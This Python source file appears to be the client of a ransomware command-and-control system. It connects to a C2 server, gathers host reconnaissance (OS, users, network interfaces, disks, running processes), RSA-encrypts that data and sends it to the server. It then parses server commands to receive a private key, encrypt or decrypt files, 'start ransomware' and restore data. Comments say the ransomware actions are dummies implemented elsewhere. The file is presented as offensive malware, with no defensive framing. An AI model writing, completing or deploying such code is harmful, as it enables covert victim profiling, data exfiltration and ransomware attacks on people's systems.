import socket
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
import platform
import getpass
import psutil
import json

class C2Client:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connect_to_server(self):
        self.client_socket.connect((self.host, self.port))
        print(f"Connected to server at {self.host}:{self.port}")

    def receive_public_key(self):
        public_key_pem = self.client_socket.recv(4096)
        public_key = serialization.load_pem_public_key(
            public_key_pem,
            backend=default_backend()
        )
        return public_key

    def gather_system_info(self):
        system_info = {
            'OS': platform.system(),
            'OS Release': platform.release(),
            'OS Version': platform.version(),
            'Architecture': platform.machine(),
            'Hostname': socket.gethostname(),
            'Processor': platform.processor(),
            'Physical Cores': psutil.cpu_count(logical=False),
            'Total Cores': psutil.cpu_count(logical=True),
            'RAM': f"{round(psutil.virtual_memory().total / (1024.0 ** 3))} GB",
            'IP Address': self.get_ip_address(),
            'Network Interfaces': self.get_network_interfaces(),
            'Current User': getpass.getuser(),
            'Users': [user.name for user in psutil.users()],
            'Disks': self.get_disks_info(),
            'Processes': self.get_processes_info()
        }
        return system_info

    def get_ip_address(self):
        try:
            return socket.gethostbyname(socket.gethostname())
        except socket.gaierror:
            return 'Unable to resolve IP'

    def get_network_interfaces(self):
        interfaces = []
        for interface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    interfaces.append({
                        'Interface': interface,
                        'IP Address': addr.address,
                        'Netmask': addr.netmask,
                        'Broadcast IP': addr.broadcast
                    })
        return interfaces

    def get_disks_info(self):
        return [{
            'Device': disk.device,
            'Mountpoint': disk.mountpoint,
            'Fstype': disk.fstype,
            'Total Size': f"{round(psutil.disk_usage(disk.mountpoint).total / (1024.0 ** 3))} GB"
        } for disk in psutil.disk_partitions()]

    def get_processes_info(self):
        return [{
            'pid': p.info['pid'],
            'name': p.info['name'],
            'username': p.info['username']
        } for p in psutil.process_iter(['pid', 'name', 'username'])]

    def send_system_info(self, public_key):
        system_info = self.gather_system_info()
        info_str = json.dumps(system_info, indent=4)
        info_bytes = info_str.encode('utf-8')

        print("Attempting to encrypt data in chunks")
        max_chunk_size = 190

        chunks = [info_bytes[i:i + max_chunk_size] for i in range(0, len(info_bytes), max_chunk_size)]
        for chunk in chunks:
            encrypted_chunk = public_key.encrypt(
                chunk,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            self.client_socket.sendall(encrypted_chunk)

        print("Successfully encrypted and sent data in chunks")
        self.client_socket.sendall(b'EOF')  # Send end of file signal

    def wait_for_private_key(self):
        print("Waiting for private key from the server...")
        received_data = bytearray()  # Use a bytearray to accumulate data
        try:
            while True:
                data = self.client_socket.recv(4096)  # Adjust buffer size as needed
                if not data:
                    break  # Break if no more data is received indicating connection is closed
                received_data += data

                if data.endswith(b'EOF'):  # Check if the end signal is at the end of this batch of data
                    received_data = received_data[:-3]  # Remove EOF from the data if it's there
                    break

            if received_data:
                print("Received data from server.")
                if received_data.startswith(b'pk'):
                    received_data = received_data[2:]
                    try:
                        private_key = serialization.load_pem_private_key(
                            received_data,
                            password=None,
                            backend=default_backend()
                        )
                        print("Private key successfully received and loaded.")
                        private_key_file_path = 'received_private_key.pem'
                        with open(private_key_file_path, 'wb') as key_file:
                            key_file.write(received_data)  # Write the PEM-encoded private key data

                        return private_key  # Optionally return the private key object
                    except ValueError as e:
                        print("Received data is not a valid private key:", e)

                # Encrypt a file
                elif received_data.startswith(b'enc'):
                    received_data = received_data[3:]
                    print("Attempting to encrypt file...")

                # Decrypt a file
                elif received_data.startswith(b'dec'):
                    received_data = received_data[3:]
                    print("Attempting to decrypt file...")

                # Dummy commands. Implemented already in C/C++ so just testing networking
                # Launch ransomware
                elif received_data.startswith(b'ran'):
                    received_data = received_data[3:]
                    print("Starting ransomware...")
                # Decrypt system
                elif received_data.startswith(b'res'):
                    received_data = received_data[3:]
                    print("Restoring data...")

        except ValueError as e:
            print("Error initalizing socket: ", e)

    def run(self):
        try:
            self.connect_to_server()
            public_key = self.receive_public_key()

            # Send system information after receiving the public key
            self.send_system_info(public_key)

            # TODO: Change this to wait for general commands
            # Wait for the server to send a private key
            self.wait_for_private_key()
            
        except Exception as e:
            print(f"An error occurred: {e}")
        finally:
            self.client_socket.close()
            print("Connection closed.")

if __name__ == '__main__':
    c2_client = C2Client("localhost", 8888)
    c2_client.run()
